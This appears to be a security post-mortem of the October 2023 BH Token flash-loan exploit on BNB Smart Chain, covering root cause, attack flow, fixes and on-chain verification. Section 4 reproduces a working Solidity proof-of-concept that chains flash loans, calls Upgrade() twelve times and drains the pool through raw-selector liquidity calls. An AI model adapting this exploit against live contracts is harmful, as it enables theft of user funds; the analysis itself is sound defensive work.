# BH Token — Business Logic Vulnerability Analysis

| Item | Details |
|------|------|
| **Date** | 2023-10-11 |
| **Protocol** | BH Token |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$1,270,000 (on-chain confirmed: 1,275,981.82 BUSDT) |
| **Attacker EOA** | [0xfdbf...3464](https://bscscan.com/address/0xfdbfceea1de360364084a6f37c9cdb7aaea63464) |
| **Attack Contract** | [0x216c...480c](https://bscscan.com/address/0x216ccfd4fb3f2267677598f96ef1ff151576480c) |
| **Vulnerable Contract** | [0xcc61...52b5](https://bscscan.com/address/0xcc61cc9f2632314c9d452aca79104ddf680952b5) |
| **Attack Tx** | [0xc11e...7662](https://bscscan.com/tx/0xc11e4020c0830bcf84bfa197696d7bfad9ff503166337cb92ea3fade04007662) |
| **Attack Block** | 32,512,074 |
| **Root Cause** | LP ratio manipulation via repeated `Upgrade()` calls — Business Logic Flaw (Price Manipulation via Business Logic Flaw) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/BH_exp.sol) |
| **Analysis Reference** | [BeosinAlert](https://twitter.com/BeosinAlert/status/1712139760813375973) · [DecurityHQ](https://twitter.com/DecurityHQ/status/1712118881425203350) |

---

## 1. Vulnerability Overview

The BH Token protocol suffered approximately $1.27M in losses on October 11, 2023, due to a flash loan attack exploiting a business logic flaw.

The attacker chained five DODO Protocol DPP Oracle pools together with PancakeSwap V2/V3 pools via nested flash loans to acquire a large amount of BUSDT without collateral. They then called the `Upgrade(lpToken)` function — present in the unverified contract (`UnverifiedContract1`) of the BH protocol — **12 times in succession**, artificially distorting the liquidity ratio of the BUSDT/BH LP pool. The attacker subsequently inflated the BH token price through a large-scale swap of 22,000,000 BUSDT, and extracted disproportionate profits by removing LP 10 times repeatedly under the skewed ratio.

Three core vulnerabilities acted in combination:
1. No access control or call-count limit on the `Upgrade()` function, allowing anyone to call it repeatedly
2. A business logic flaw causing the LP pool's internal price ratio to change abnormally on each `Upgrade()` call
3. The manipulated ratio being reflected during liquidity removal (`0x4e290832`), yielding excess returns relative to the amount deposited

---

## 2. Vulnerable Code Analysis

### 2.1 `Upgrade(address _lpToken)` — Business Logic Flaw Allowing Repeated Calls (Core)

**Vulnerable Code (estimated):**
```solidity
// ❌ Vulnerability 1: No access control modifier — anyone can call
// ❌ Vulnerability 2: No call-count limit — unlimited repetition possible
// ❌ Vulnerability 3: No lpToken parameter validation — arbitrary LP can be specified
function Upgrade(address _lpToken) external {
    // Internally rebalances the liquidity ratio in the LP pool
    // The BUSDT:BH internal weight shifts on each call
    // Repeated calls cause the ratio to accumulate and become severely skewed
    _adjustPoolRatio(_lpToken);
}
```

**Fixed Code:**
```solidity
// ✅ Fix: Only callable by admin
modifier onlyOwner() {
    require(msg.sender == owner, "Unauthorized: only admin can call");
    _;
}

// ✅ Fix: Track whether upgrade has been completed
bool public upgraded;

function Upgrade(address _lpToken) external onlyOwner {
    // ✅ Prevent duplicate calls
    require(!upgraded, "Upgrade already completed");
    // ✅ Whitelist validation for LP token address
    require(allowedLpTokens[_lpToken], "LP token not allowed");
    upgraded = true;
    _adjustPoolRatio(_lpToken);
}
```

**Issue**: The `Upgrade()` function was likely designed as an administrative function for a one-time protocol upgrade, but the absence of access control such as `onlyOwner` makes it callable repeatedly by any external account. The attacker called it 12 consecutive times, cumulatively distorting the internal liquidity ratio calculation of the BUSDT/BH LP pool.

---

### 2.2 Add/Remove Liquidity Functions (`0x33688938` / `0x4e290832`) — Reflecting the Skewed Ratio

**Vulnerable Code (estimated):**
```solidity
// selector: 0x33688938 — addLiquidity
// ❌ Vulnerability: Uses the internal ratio distorted by Upgrade() as-is
function addLiquidity(uint256 busdtAmount) external {
    // LP token mint amount determined by the distorted internal ratio
    uint256 lpToMint = busdtAmount * internalRatio / BASE;
    _mint(msg.sender, lpToMint);
}

// selector: 0x4e290832 — removeLiquidity
// ❌ Vulnerability: Applies the manipulated BH balance ratio (55%) directly, allowing excess withdrawal
function removeLiquidity(uint256 lpAmount) external {
    // lpAmount at attack time = BH.balanceOf(busdt_bh_lp) * 55 / 100
    // The manipulated ratio is applied as-is, returning excess BUSDT vs. amount deposited
    uint256 busdtOut = lpAmount * totalBusdt / totalBH;
    BUSDT.transfer(msg.sender, busdtOut);
}
```

**Issue**: The liquidity removal logic performs ratio calculation based on 55% of the BH balance in the pool. When executed while the internal ratio has been skewed by repeated `Upgrade()` calls, this allows the attacker to withdraw more BUSDT than was originally deposited.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA (`0xfdbf...3464`) pre-deployed the attack contract (`0x216c...480c`)
- Attack contract contained logic to grant `UnverifiedContract1` and Router `approve` permissions for BUSDT and BH tokens
- No pre-deposited funds — entire capital sourced solely via flash loans

### 3.2 Execution Phase

**[Phase 1] Secure Funds via Chained Flash Loans**

```
1. DPPOracle1.flashLoan(0, ~1.52M BUSDT)
   └─▶ 2. DPPOracle2.flashLoan(0, ~additional BUSDT)
          └─▶ 3. DPPOracle3.flashLoan(0, ~additional BUSDT)
                 └─▶ 4. DPP.flashLoan(0, ~additional BUSDT)
                        └─▶ 5. DPPAdvanced.flashLoan(0, ~additional BUSDT)
                               └─▶ 6. WBNB_BUSDT.swap(10,000,000 BUSDT)
                                      └─▶ 7. BUSDT_USDC(V3).flash(15,000,000 BUSDT)
```

**[Phase 2] Business Logic Manipulation**

```
8. BUSDT, BH → UnverifiedContract1 approve (unlimited)
9. UnverifiedContract1.Upgrade(lpToken) × 12 iterations
   → Cumulative distortion of LP pool's internal liquidity ratio
10. UnverifiedContract1.addLiquidity(3,000,000 BUSDT) [selector: 0x33688938]
    → Acquire LP tokens at the skewed ratio
```

**[Phase 3] Further Ratio Manipulation via Swap**

```
11. Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        22,000,000 BUSDT → BH,
        recipient: unverifiedContractAddr2
    )
    → Massive BUSDT injection causes BH price/ratio to spike
```

**[Phase 4] Extract Profit by Removing Liquidity (10 iterations)**

```
12~21. [10 iterations]
    lpAmount = BH.balanceOf(busdt_bh_lp) * 55 / 100
    UnverifiedContract1.removeLiquidity(lpAmount) [selector: 0x4e290832]
    → Each iteration recovers excess BUSDT at the manipulated ratio
```

**[Phase 5] Repay Flash Loans and Realize Profit**

```
22. Repay BUSDT_USDC V3 pool: 15,009,000 BUSDT (15M + fee)
23. Repay WBNB_BUSDT pool: 10,060,000 BUSDT
24. Repay each flash loan in reverse DPP chain order
25. Transfer 1,275,981.82 BUSDT to attacker EOA (profit)
```

### 3.3 Attack Flow Diagram

```
Attacker EOA (0xfdbf...3464)
        │
        │ calls testExploit()
        ▼
┌───────────────────────────────┐
│   Attack Contract             │
│   (0x216c...480c)            │
└───────────────────────────────┘
        │
        │ [Step 1] 5-layer nested DPP flash loans
        ▼
┌──────────────────────────────────────────────────────────────┐
│  DPPOracle1 → DPPOracle2 → DPPOracle3 → DPP → DPPAdvanced  │
│                    Total ~1.52M BUSDT secured                │
└──────────────────────────────────────────────────────────────┘
        │
        │ WBNB_BUSDT.swap(10M BUSDT)
        ▼
┌──────────────────────────────┐
│  PancakeSwap V2              │
│  WBNB/BUSDT Pool             │
│  10,000,000 BUSDT borrowed   │
└──────────────────────────────┘
        │
        │ BUSDT_USDC.flash(15M BUSDT)
        ▼
┌──────────────────────────────┐
│  PancakeSwap V3              │
│  BUSDT/USDC Pool             │
│  15,000,000 BUSDT borrowed   │
│  Total secured: ~26.52M+ BUSDT│
└──────────────────────────────┘
        │
        │ [Step 2] approve + business logic manipulation
        ▼
┌──────────────────────────────────────────────────────────────────┐
│  UnverifiedContract1 (0x8cA7...623a)                            │
│                                                                  │
│  ① Upgrade(lpToken) × 12 iterations ──────────────────────────▶ │
│     └─▶ Cumulative distortion of LP internal ratio              │
│                                                                  │
│  ② addLiquidity(3,000,000 BUSDT) ────────────────────────────▶ │
│     └─▶ Acquire LP tokens at skewed ratio                       │
└──────────────────────────────────────────────────────────────────┘
        │
        │ [Step 3] Manipulate BH price via swap
        ▼
┌──────────────────────────────┐
│  PancakeSwap V2 Router       │
│  22,000,000 BUSDT → BH      │
│  → BH price/ratio spikes     │
└──────────────────────────────┘
        │
        │ [Step 4] Remove LP 10 times
        ▼
┌──────────────────────────────────────────────────────────────────┐
│  UnverifiedContract1                                             │
│  removeLiquidity(BH balance × 55%) × 10 iterations              │
│  → Excess BUSDT recovered each iteration                        │
│  Total recovered: ~25M+ BUSDT                                    │
└──────────────────────────────────────────────────────────────────┘
        │
        │ [Step 5] Repay flash loans
        ▼
┌──────────────────────────────┐
│  V3: repay 15,009,000 BUSDT  │
│  V2: repay 10,060,000 BUSDT  │
│  DPP chain: sequential repay │
└──────────────────────────────┘
        │
        │ Net profit transfer
        ▼
Attacker EOA: +1,275,981.82 BUSDT (~$1.27M)
```

### 3.4 Outcome

- **Attacker Profit**: 1,275,981.82 BUSDT ($1,275,981)
- **Protocol Loss**: ~$1,270,000
- **Total Log Count**: 596 events (including 299 BEP-20 Transfer events)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/BH_exp.sol

contract ContractTest is Test {
    // ... (constant declarations omitted)

    function testExploit() public {
        // [Step 1] Initiate first flash loan from DODO DPP Oracle
        // data=0: chain into next flash loan from DPPFlashLoanCall
        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), abi.encode(0));
    }

    // [Step 2] 5-layer nested flash loan callback — branching by data value
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (abi.decode(data, (uint256)) == 0) {
            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), abi.encode(1));
        } else if (abi.decode(data, (uint256)) == 1) {
            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), abi.encode(2));
        } else if (abi.decode(data, (uint256)) == 2) {
            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), abi.encode(3));
        } else if (abi.decode(data, (uint256)) == 3) {
            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), abi.encode(4));
        } else {
            // [Step 3] Borrow 10M BUSDT via swap from PancakeSwap V2
            WBNB_BUSDT.swap(10_000_000 * 1e18, 0, address(this), abi.encode(0));
        }
        // Repay each DPP flash loan
        BUSDT.transfer(msg.sender, quoteAmount);
    }

    // [Step 4] PancakeSwap V2 callback — triggers additional V3 flash loan
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // Secure additional 15M BUSDT from PancakeSwap V3
        BUSDT_USDC.flash(address(this), 15_000_000 * 1e18, 0, abi.encode(0));
        // Repay V2: principal + 0.6% fee
        BUSDT.transfer(address(WBNB_BUSDT), amount0 + 60_000 * 1e18);
    }

    // [Step 5] PancakeSwap V3 callback — executes core attack logic
    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        // approve: allow UnverifiedContract1 to use BUSDT and BH
        BUSDT.approve(address(UnverifiedContract1), type(uint256).max);
        BUSDT.approve(address(Router), type(uint256).max);
        BH.approve(address(UnverifiedContract1), type(uint256).max);

        // [CORE VULNERABILITY EXPLOIT] Call Upgrade() 12 times — cumulatively distort LP internal ratio
        uint8 i;
        while (i < 12) {
            UnverifiedContract1.Upgrade(lpToken);
            ++i;
        }

        // Add liquidity at skewed ratio (3M BUSDT)
        (bool success,) = address(UnverifiedContract1).call(
            abi.encodeWithSelector(bytes4(0x33688938), 3_000_000 * 1e18)
        );
        require(success, "addLiquidity failed");

        // Swap 22M BUSDT → BH: further skews the BH price/ratio in the manipulated pool
        BUSDTToBH();

        // [PROFIT EXTRACTION] Remove liquidity 10 times — based on 55% of BH balance
        i = 0;
        while (i < 10) {
            // Convert 55% of BH pool balance to LP and remove → recover excess BUSDT
            uint256 lpAmount = (BH.balanceOf(busdt_bh_lp) * 55) / 100;
            (success,) = address(UnverifiedContract1).call(
                abi.encodeWithSelector(bytes4(0x4e290832), lpAmount)
            );
            require(success, "removeLiquidity failed");
            ++i;
        }

        // Repay V3 including fee
        BUSDT.transfer(address(BUSDT_USDC), 15_000_000 * 1e18 + fee0);
    }

    // Swap 22M BUSDT to BH (for price/ratio manipulation)
    function BUSDTToBH() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(BH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            22_000_000 * 1e18, 0, path, unverifiedContractAddr2, block.timestamp + 100
        );
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Upgrade() missing access control and allowing repeated calls | CRITICAL | CWE-284 (Improper Access Control) | `03_access_control.md`, `11_logic_error.md` |
| V-02 | Flash loan-based LP ratio manipulation (price manipulation) | CRITICAL | CWE-682 (Incorrect Calculation) | `02_flash_loan.md`, `04_oracle_manipulation.md` |
| V-03 | Manipulated ratio reflected during liquidity removal — no validation | HIGH | CWE-20 (Improper Input Validation) | `11_logic_error.md`, `16_accounting_sync.md` |

### V-01: Upgrade() Missing Access Control and Allowing Repeated Calls

- **Description**: The `Upgrade(address _lpToken)` function in `UnverifiedContract1` has no `onlyOwner` or equivalent access control, making it callable by any external account, with no limit on the number of calls. The attacker called it 12 consecutive times, cumulatively distorting the LP pool's internal liquidity ratio.
- **Impact**: Manipulation of the BUSDT:BH ratio in the LP pool → enables extraction of disproportionate profits during subsequent liquidity add/remove steps
- **Attack Condition**: Anyone who knows the contract address can call it without any prior deposit

### V-02: Flash Loan-Based LP Ratio Manipulation

- **Description**: A total of approximately 26.52M BUSDT was sourced without collateral from 5 DODO DPP Oracles and PancakeSwap V2/V3. A large liquidity addition to the BH protocol LP pool and a 22M BUSDT swap were then executed, significantly manipulating the BUSDT:BH exchange ratio.
- **Impact**: Excess profit extraction when removing liquidity at a ratio that diverges from the normal market price
- **Attack Condition**: Flash loan providers are available and the protocol's liquidity pool is susceptible to external swaps

### V-03: Manipulated Ratio Reflected During Liquidity Removal — No Validation

- **Description**: The `removeLiquidity` logic (selector `0x4e290832`) references the current BH balance in the LP pool (`BH.balanceOf(busdt_bh_lp)`) in real time and uses a 55% ratio to determine the withdrawal amount. When this calculation runs while the pool is in a manipulated state, excess BUSDT is returned relative to what was deposited.
- **Impact**: Excess BUSDT recoverable on each of the 10 repeated removals, even as the BH balance progressively decreases
- **Attack Condition**: Requires V-01 and V-02 to have been exploited as prerequisites

---

## 6. Remediation Recommendations

### Immediate Actions

**Enforce access control on Upgrade() and guarantee single execution:**
```solidity
// ✅ Fix: onlyOwner + guarantee single execution
address private owner;
bool public upgradeExecuted;
mapping(address => bool) public allowedLpTokens;

modifier onlyOwner() {
    require(msg.sender == owner, "Unauthorized");
    _;
}

function Upgrade(address _lpToken) external onlyOwner {
    // Guarantee single execution
    require(!upgradeExecuted, "Upgrade already completed");
    // Only process allowed LP tokens
    require(allowedLpTokens[_lpToken], "LP token not allowed");
    upgradeExecuted = true;
    _adjustPoolRatio(_lpToken);
    emit Upgraded(msg.sender, _lpToken);
}
```

**Slippage and ratio cap validation during liquidity removal:**
```solidity
// ✅ Fix: minimum output parameter + ratio cap validation
function removeLiquidity(uint256 lpAmount, uint256 minBusdtOut) external {
    // Limit maximum removable ratio in a single transaction (e.g., 10%)
    uint256 maxRemovable = totalLpSupply / 10;
    require(lpAmount <= maxRemovable, "Exceeds single removal limit");

    uint256 busdtOut = _calculateOut(lpAmount);
    // Slippage protection
    require(busdtOut >= minBusdtOut, "Slippage exceeded");
    _burnLp(msg.sender, lpAmount);
    BUSDT.transfer(msg.sender, busdtOut);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Upgrade() lacks authorization | Apply `onlyOwner` or `AccessControl` + use `upgradeExecuted` state variable to prevent re-execution |
| V-01: Unlimited repeated calls | Apply OpenZeppelin `Initializable` pattern to admin functions, restricting execution to exactly once |
| V-02: Flash loan price manipulation | Use TWAP (Time-Weighted Average Price) oracle instead of spot price — reference at least a multi-block average |
| V-02: Single-block large-scale manipulation | Introduce a per-block cap on liquidity changes (e.g., no more than a fixed % of TVL removable) |
| V-03: Manipulated ratio reflected | Base liquidity removal calculations on a pool state snapshot + make minimum withdrawal amount parameter mandatory |
| General security | Do not place core logic in unverified (source-unavailable) contracts — ensure transparency |
| Monitoring | On-chain monitoring to detect repeated calls to the same function (e.g., Forta, OpenZeppelin Defender) |

---

## 7. Lessons Learned

1. **Administrative functions must have access control**: Functions that modify protocol state — such as `Upgrade()`, `initialize()`, and `migrate()` — must have `onlyOwner` or multisig approval applied. Without it, anyone can call them repeatedly to manipulate state. Functions that alter LP ratios or internal weights in particular must be classified as the highest risk tier.

2. **One-time logic must be protected with the `Initializable` pattern**: Upgrade/migration functions intended to run only once must have a state variable preventing re-execution, similar to OpenZeppelin `Initializable`'s `initializer` modifier.

3. **Do not place core logic in unverified contracts**: In this attack, the vulnerable contract (`UnverifiedContract1`) had unverified source code on BSCScan. Contracts containing core business logic must have their source code published and audited.

4. **Liquidity calculations relying on spot prices are vulnerable to flash loan attacks**: Using real-time balances (`balanceOf`) directly for price/ratio calculations allows single-transaction manipulation via flash loans. A TWAP oracle or per-block limits must be introduced.

5. **Nested flash loans exponentially scale the attacker's capital**: Chaining 5 DODO DPP pools via nested callbacks allows securing far more capital without collateral than a single callback would. Protocols must include guards to detect large-scale liquidity inflows within a single transaction.

6. **Hardcoded function selectors are a red flag**: The fact that the PoC calls via raw selectors (`0x33688938`, `0x4e290832`) rather than function names indicates the target contract's source code is not publicly available. During audits, external contract calls that operate without an ABI must always receive additional scrutiny.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Code Value | On-Chain Actual Value | Match |
|------|------------|-------------|----------|
| WBNB_BUSDT swap request | 10,000,000 BUSDT | 10,000,000 BUSDT | ✅ Match |
| BUSDT_USDC V3 flash loan | 15,000,000 BUSDT | 15,000,000 BUSDT | ✅ Match |
| V2 repayment | amount0 + 60,000 BUSDT | 10,060,000 BUSDT | ✅ Match |
| V3 repayment | 15,000,000 + fee | 15,009,000 BUSDT | ✅ Match |
| BUSDTToBH swap | 22,000,000 BUSDT | 22,000,000 BUSDT | ✅ Match |
| addLiquidity | 3,000,000 BUSDT | 3,000,000 BUSDT | ✅ Match |
| Attacker final profit | ~$1.27M | 1,275,981.82 BUSDT | ✅ Match |

### 8.2 On-Chain Event Log Sequence (Key Events)

Key Transfer events related to the attack contract among the total 596 event logs:

| Order | Event | from | to | Amount |
|------|--------|------|----|------|
| [5] | BUSDT Transfer (DPP1) | DPPOracle1 | Attack Contract | 1,521,678.72 |
| [6] | BUSDT Transfer (V2) | WBNB_BUSDT | Attack Contract | 10,000,000.00 |
| [7] | BUSDT Transfer (V3) | BUSDT_USDC | Attack Contract | 15,000,000.00 |
| [11~263] | BUSDT Transfer × 12 times | Attack Contract | UnverifiedContract1 | Incremental (10→3,000,000) |
| [302] | BH Transfer | UnverifiedContract1 | Attack Contract | 66,274,929.73 |
| [304] | BUSDT Transfer (swap input) | Attack Contract | BUSDT_BH_LP | 22,000,000.00 |
| [320~563] | BUSDT Transfer × 10 times (LP removal) | UnverifiedContract1 | Attack Contract | Decreasing pattern |
| [579] | BUSDT Transfer (V3 repayment) | Attack Contract | BUSDT_USDC | 15,009,000.00 |
| [581] | BUSDT Transfer (V2 repayment) | Attack Contract | WBNB_BUSDT | 10,060,000.00 |
| [585] | BUSDT Transfer (profit) | Attack Contract | Attacker EOA | 1,275,981.82 |

### 8.3 Precondition Verification (Based on Pre-Attack Block 32,512,073)

| Item | Pre-Attack State |
|------|------------|
| BUSDT/BH LP BUSDT balance | 1,393,467.01 BUSDT |
| BUSDT/BH LP BH balance | 133,854,404.34 BH |
| LP totalSupply | 13,630,848,563.05 (unit-adjusted) |
| Attack Contract → UnverifiedContract1 allowance | 0 (approved during attack) |

> It is confirmed on-chain that the attack contract had not set approve in advance; the approval was performed immediately inside `pancakeV3FlashCallback` during attack execution.